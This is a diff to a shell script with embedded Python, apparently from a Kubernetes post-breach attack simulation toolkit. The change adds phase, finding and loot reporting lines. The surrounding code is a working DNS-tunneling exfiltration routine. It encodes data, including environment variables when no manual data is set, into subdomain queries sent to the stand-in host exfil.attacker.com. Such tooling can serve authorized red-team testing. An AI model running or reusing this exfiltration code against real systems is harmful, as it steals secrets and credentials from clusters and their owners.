@@ -34,12 +34,14 @@ source "$SCRIPT_DIR/lib.sh"
 EXFIL_DOMAIN="${EXFIL_DOMAIN:-exfil.attacker.com}"
 
 banner "Post-Breach: DNS Tunneling Exfiltration"
+echo "@PHASE DNS-Exfiltration"
 
 PYTHON_CODE="${K8S_API_PREAMBLE}
 
 exfil_domain = '${EXFIL_DOMAIN}'
 manual_data = '''${EXFIL_DATA}'''
 
+print('@PHASE Prepare-Exfil')
 print('=' * 60)
 print('  DNS TUNNELING: Data Exfiltration')
 print('=' * 60)
@@ -53,6 +55,8 @@ def dns_exfil(data, label='data'):
     # DNS labels max 63 chars, split into chunks
     chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
     print(f'  Exfiltrating {label}: {len(data)} bytes in {len(chunks)} DNS queries')
+    print(f'@FINDING high Exfiltrating {label}: {len(data)} bytes via {len(chunks)} DNS queries')
+    print(f'@LOOT exfil-proof dns:{label}:{len(data)}-bytes')
     for i, chunk in enumerate(chunks):
         subdomain = f'{chunk}.{i}.{label}.{exfil_domain}'
         try:
@@ -61,6 +65,7 @@ def dns_exfil(data, label='data'):
             pass  # Expected — the domain doesn't resolve, but the query was logged
         print(f'    [{i+1}/{len(chunks)}] {subdomain[:60]}...')
 
+print('@PHASE Execute-Exfil')
 if manual_data:
     dns_exfil(manual_data, 'manual')
 else:
@@ -86,6 +91,7 @@ else:
             dns_exfil(f'{k}={v}', f'env-{k.lower()}')
 
 print()
+print('@RESULT success DNS tunneling exfiltration complete')
 print('DNS tunneling exfiltration complete.')
 print('Data encoded as DNS queries — captured by attacker DNS server.')
 "
